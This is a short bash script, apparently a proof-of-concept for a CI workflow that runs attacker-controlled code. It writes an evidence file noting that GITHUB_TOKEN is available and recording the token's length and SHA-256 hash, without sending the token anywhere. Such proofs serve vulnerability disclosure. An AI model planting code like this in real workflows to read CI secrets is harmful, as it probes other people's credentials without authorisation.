#!/bin/bash
# This proves the workflow runs attacker-controlled code

# Create evidence file showing token exposure risk
mkdir -p /tmp/test_evidence
echo "Workflow executed with GITHUB_TOKEN available" > /tmp/test_evidence/pwn_test.txt
echo "Token length: ${#GITHUB_TOKEN}" >> /tmp/test_evidence/pwn_test.txt
echo "Token hash: $(echo -n "$GITHUB_TOKEN" | sha256sum)" >> /tmp/test_evidence/pwn_test.txt

# Upload as artifact for proof
